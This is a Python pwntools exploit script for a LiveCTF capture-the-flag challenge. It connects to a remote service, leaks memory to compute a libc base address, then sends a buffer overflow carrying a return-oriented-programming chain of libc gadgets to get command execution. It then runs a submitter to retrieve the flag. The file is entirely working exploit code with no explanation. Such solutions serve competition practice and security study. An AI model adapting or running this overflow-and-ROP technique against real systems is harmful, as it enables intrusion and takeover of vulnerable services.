#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))
io.sendline(b'10 3')
io.send(b'jinmo123.\xf1')
def recv(length):
    data = b''
    for i in range(length):
        print(len(data))
        io.recvuntil(b'\x1b')
        io.recvuntil(b'm ')
        data += io.recv(1)
    return data
recv(9)
io.send(b'\xf2'*0x91)
b=recv(0xfc)
b=b[0x97:]
print(hexdump(b))
libc=u64(b[:8])-0x29d90
print(hex(libc))
print(hex(libc+0x50d70))
# pause()
io.sendline(b'a'*0x6e+p8(0x6e+0x13)+p64(libc+0x2be51)+p64(0)+p64(libc+0x2a3e6)+p64(libc+0x2a3e5)+p64(libc+0x00000000001D8698)+p64(libc+0xeb460)+b'\x00'*0x40)
io.sendline(b'./submitter')
flag = io.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
# io.interactive()